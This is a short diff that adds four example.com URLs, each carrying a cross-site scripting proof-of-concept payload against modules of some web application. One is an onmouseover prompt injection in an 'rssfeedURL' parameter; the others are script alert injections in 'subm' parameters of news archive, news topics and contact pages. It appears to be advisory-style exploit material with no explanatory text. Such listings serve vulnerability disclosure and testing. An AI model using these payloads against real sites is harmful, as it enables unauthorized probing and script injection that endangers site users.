@@ -1,0 +1,4 @@
+http://www.example.com/manual/caferss/example.php?rssfeedURL=&quot;%20onmouseover=prompt(1)%20xss=&quot;&amp;submit=OK
+http://www.example.com/modules/news/archive.php?subm=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/modules/news/topics.php?subm=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/modules/contact/index.php?op=contact&amp;subm=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
